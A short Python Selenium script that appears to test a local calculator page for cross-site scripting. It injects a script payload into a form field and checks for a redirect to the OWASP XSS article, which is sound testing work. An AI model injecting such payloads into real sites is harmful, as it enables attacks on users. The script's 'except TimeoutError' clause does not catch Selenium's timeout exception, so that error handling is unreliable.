from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Create a WebDriver instance using Chrome
driver = webdriver.Chrome()

# Get the page
driver.get("http://localhost/calculator.html")

# Inject payload
visitor_name = driver.find_element(By.NAME, "visitor_name").send_keys("<script>window.location.href='https://owasp.org/www-community/attacks/xss/'</script>")
number1 = driver.find_element(By.NAME, "number1").send_keys('1')
number2 = driver.find_element(By.NAME, "number2").send_keys('2')

# Submit the form
driver.find_element(By.ID, 'submit_button').click()

# Wait for the redirect to occur and the new page to load
try:
    WebDriverWait(driver, 10).until(EC.url_to_be("https://owasp.org/www-community/attacks/xss/"))
    print("Page redirected to OWASP successfully.")
except TimeoutError:
    print("Page did not redirect to OWASP in the expected time.")

# Get the page source
page_source = driver.page_source
print(page_source)

# Quit the web driver
driver.quit()
